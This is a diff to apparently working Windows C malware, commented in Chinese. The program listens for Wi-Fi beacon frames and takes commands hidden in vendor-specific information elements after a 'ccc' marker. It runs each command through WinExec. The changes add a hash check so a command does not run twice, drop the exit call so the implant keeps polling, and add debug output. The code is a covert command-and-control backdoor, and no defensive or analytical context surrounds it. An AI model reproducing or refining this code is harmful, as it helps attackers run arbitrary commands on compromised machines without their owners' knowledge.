@@ -26,14 +26,16 @@ struct ie_data
 int wmain()
 {
 
-	HWND hwnd;
-	hwnd = FindWindow(L"ConsoleWindowClass", NULL); //处理顶级窗口的类名和窗口名称匹配指定的字符串,不搜索子窗口。  
-	if (hwnd)
-	{
-		ShowWindow(hwnd, SW_HIDE);               //设置指定窗口的显示状态  
-	}
+	//HWND hwnd;
+	//hwnd = FindWindow(L"ConsoleWindowClass", NULL); //处理顶级窗口的类名和窗口名称匹配指定的字符串,不搜索子窗口。  
+	//if (hwnd)
+	//{
+	//	ShowWindow(hwnd, SW_HIDE);               //设置指定窗口的显示状态  
+	//}
 
 	// Declare and initialize variables.
+
+	char hash[9] = { '\0' }; //防止命令重复执行的hash
 
 	HANDLE hClient = NULL;
 	DWORD dwMaxClient = 2;   //    
@@ -244,12 +246,25 @@ int wmain()
 							printf("找到控制端!\n");
 							char *pp = (char *)((unsigned long)bss_entry + bss_entry->ulIeOffset);
 							int total_size = bss_entry->ulIeSize;
+							printf("bss_entry:%s \n", pp);
+							printf("size:%d \n", sizeof(pp));
+							//getchar();
 							//printf("长度：%d",total_size);
 							for (;;) {
 								ie_data * ie = (struct ie_data *)pp;
+								//printf("ie:%s \n", pp);
+								//printf("id:%s \n", ie->id);cmd
+								//printf("len:%d \n", ie->len);
+								//printf("var:%s \n", ie->val);
+								//getchar();
+								printf("ie->id: %d", ie->id);
+								printf("ie->id: %d", ie->len);
+								//printf("ie->id: %s", ie->val[0]);
+								//getchar();
 								if ((int)ie->id == 221)
 								{
-									//printf("221!!!!!\n");
+									printf("221!!!!!\n");
+									//getchar();
 									// eg. "ccccmd /c notepad"  
 									char *magic = (char *)&ie->val[0];
 									printf(magic);
@@ -257,16 +272,34 @@ int wmain()
 									if (strncmp(magic, "ccc", 3) == 0)
 									{
 										char command[240] = { 0 };
-										strncpy(command, magic + 3, ie->len - 3);
+										char hash_tmp[9] = { '\0' }; //存放hash值
+										
+										strncpy(hash_tmp, magic + 3, 8);//从数据帧拿到hash值赋值
+										if (strncmp(hash, hash_tmp, 8) == 0) {
+											//命令已经执行过，break
+											break;
+										}
+										else {
+											//命令未重复执行，写入hash
+											strncpy(hash, hash_tmp, 8);
+										}
+
+										strncpy(command, magic + 11, ie->len - 11);
 										//执行命令
+										printf("哈希值：%s\n", hash);
 										printf("提取命令：%s\n",command);
+
 										WinExec(command, SW_NORMAL);
-										exit(1); //退出
+										//getchar();
+										//exit(1); //退出
 										break;
 									}
 								}
 								pp += sizeof(struct ie_data) - 1 + (int)ie->len;
+								//printf("pp:%s \n", pp);
 								total_size -= sizeof(struct ie_data) - 1 + (int)ie->len;
+								printf("total_size:%d \n", total_size);
+								//getchar();
 								if  (!total_size)
 								{
 									break;  // over  
@@ -282,7 +315,7 @@ int wmain()
 			}
 		}
 		//间隔
-		Sleep(3000);
+		Sleep(4500);
 	}
 
 	if (pBssList != NULL) {
